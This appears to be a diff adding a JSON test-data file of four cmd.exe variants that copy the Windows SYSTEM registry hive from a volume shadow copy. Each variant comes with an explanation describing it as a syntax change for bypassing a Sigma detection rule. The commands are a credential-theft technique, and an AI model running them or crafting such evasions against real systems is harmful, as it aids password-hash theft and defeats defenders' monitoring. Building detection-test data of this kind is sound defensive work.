@@ -1,0 +1,18 @@
+[
+  {
+    "output": "cmd.exe /c copy \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM\" C:\\temp\\system.hive",
+    "explanation": "This command uses insertion of quotes and escape characters to maintain the same functionality while altering the syntax slightly. It remains functionally equivalent to the original Sigma rule trigger."
+  },
+  {
+    "output": "cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\system.hive",
+    "explanation": "This command omits the quotes and uses the same path structure, relying on the command-line parser to still recognize the path correctly. It preserves the original behavior while slightly changing the syntax."
+  },
+  {
+    "output": "cmd.exe /c copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\system.hive",
+    "explanation": "This command uses minimal escaping and omits unnecessary characters, relying on the Windows command interpreter to still process the path correctly. It maintains the same intent as the original command."
+  },
+  {
+    "output": "cmd.exe /c \"copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\system.hive\"",
+    "explanation": "This command wraps the entire command in quotes and uses standard escaping. It is a direct syntactic variation of the original command, making it a valid test case for bypassing the Sigma rule."
+  }
+]
